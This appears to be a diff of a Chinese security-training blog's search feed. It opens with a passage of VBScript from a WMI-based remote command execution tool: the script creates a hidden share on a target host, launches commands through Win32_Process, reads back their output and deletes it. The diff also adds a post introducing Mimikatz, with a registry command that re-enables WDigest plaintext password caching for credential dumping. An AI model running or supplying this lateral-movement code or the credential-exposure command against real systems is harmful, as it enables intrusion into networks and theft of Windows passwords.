&quot;WMI_SHARE&quot;, 0, 25, &quot;&quot;)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Share could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Invalid File Path!&quot;<br>	    	Case 22<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Name Already In Used!&quot;<br>	    	Case 24<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Directory NOT exists!&quot;<br>	    End Select<br>		If intReturn &lt;&gt; 22 Then WScript.Quit<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share created sucess.&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;<br>		WScript.Echo &quot;WMIEXEC : Share Path -&gt; &quot; &amp; FilePath<br>	End If<br>End Function<br><br>Function DeleteShare()<br>	Set colShares = objWMIService.ExecQuery _<br>		(&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;)<br>	For Each objShare In colShares<br>		intReturn = objShare.Delete<br>	Next<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Delete Share failed.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>	    	Case 25<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Share Not Exists!&quot;<br>	    End Select<br>	Else<br>	    WScript.Echo &quot;WMIEXEC : Share deleted sucess.&quot;<br>	End If<br>End Function<br><br>Function Exec(cmd, file)<br>	Set objStartup = objWMIService.Get(&quot;Win32_ProcessStartup&quot;)<br>	Set objConfig = objStartup.SpawnInstance_<br>	objConfig.ShowWindow = 12<br>	<br>	Set objProcess=objWMIService.get(&quot;Win32_Process&quot;)<br>	strExec = &quot;cmd.exe /c &quot; &amp; cmd &amp; &quot; &gt; &quot; &amp; file &amp; &quot; 2&gt;&amp;1&quot;  &#x27;2&gt;&amp;1 err<br>	If boolPersist Then<br>		strExec = cmd<br>		intPath = InStr(cmd,&quot;\&quot;)<br>		If intPath = 0 Then strExec = CurrentFolder &amp; &quot;\&quot; &amp; strExec<br>	End If<br>	&#x27;WScript.Echo strExec<br>	intReturn = objProcess.Create _<br>	    (strExec, CurrentFolder, objConfig, intProcessID)  &#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)<br>	If intReturn &lt;&gt; 0 Then<br>		WScript.Echo &quot;WMIEXEC ERROR: Process could not be created.&quot; &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Command -&gt; &quot; &amp; cmd &amp; _<br>	        vbNewLine &amp; &quot;WMIEXEC ERROR: Return value -&gt; &quot; &amp; intReturn<br>	    Select Case intReturn<br>	    	Case 2<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Access Denied!&quot;<br>			Case 3<br>				WScript.Echo &quot;WMIEXEC ERROR: Insufficient Privilege!&quot;<br>	    	Case 9<br>	    		WScript.Echo &quot;WMIEXEC ERROR: Path Not Found!&quot;<br>	    End Select<br>	Else<br>&#x27;	    WScript.Echo &quot;Process created.&quot; &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _<br>&#x27;	        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID<br>		If boolPersist Then WScript.Echo &quot;WMIEXEC : Process created. PID: &quot;&amp; intProcessID<br>	    If boolGetFolder = True Then <br>	    	boolGetFolder = False<br>	    	Exec = GetCurrentFolder()<br>	    	Exit Function<br>	    End If<br>	    &#x27;ReadResult()<br>	End If<br>End Function<br><br>Function ReadResult()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	If Not objFile.AtEndOfStream Then strContents = objFile.ReadAll<br>	objFile.Close<br>	WScript.Echo strContents<br>	&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br><br>Function GetCurrentFolder()<br>	WScript.Sleep(WAITTIME)<br>	UNCFilePath = &quot;\\&quot; &amp; host &amp; &quot;\&quot; &amp; &quot;WMI_SHARE&quot; &amp; &quot;\&quot; &amp; FileName<br>	Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>	Set objFile = fso.OpenTextFile(UNCFilePath, 1)<br>	GetCurrentFolder = objFile.ReadLine<br>	objFile.Close<br>	strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>	Exec strDelFile,&quot;nul&quot;<br>End Function<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
       <categories>
         <category>小迪安全</category>
       </categories>
   </entry>
   <entry>
-    <title>小迪安全系列-[基础阶段]</title>
-    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
-    <content><![CDATA[]]></content>
+    <title>渗透工具-[Mimikatz]</title>
+    <url>/2022/05/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BMimikatz%5D/</url>
+    <content><![CDATA[<p>一、工具简介<br>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
+<p>注意：<br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
+
+]]></content>
       <categories>
-        <category>小迪安全</category>
+        <category>工具使用</category>
       </categories>
   </entry>
   <entry>
